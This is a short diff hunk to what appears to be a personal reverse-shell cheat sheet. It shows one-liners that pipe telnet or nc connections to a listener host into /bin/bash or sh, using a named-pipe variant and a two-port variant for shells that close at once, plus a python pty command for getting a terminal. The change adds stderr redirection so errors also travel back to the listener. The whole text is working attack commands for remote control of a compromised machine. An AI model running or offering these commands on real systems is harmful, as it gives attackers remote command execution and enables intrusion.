@@ -56,10 +56,10 @@ mknod backpipe p && telnet myip 1234 0<backpipe | /bin/bash 1>backpipe
 
 #WHEN REVERSE SHELL CLOSES RIGHT AWAY
 #listen on port 1234 and 1235
-telnet myip 1234 | /bin/bash | telnet myip 1235
+telnet myip 1234 | /bin/bash 2>&1 | telnet myip 1235
 #issue commands in 1234 shell and get response in 12345 shell
 #or with nc
-nc myip 1234 | sh | nc myip 1235
+nc myip 1234 | sh 2>&1 | nc myip 1235
 
 #get a tty from within a reverse shell
 python -c 'import pty; pty.spawn("/bin/sh")'
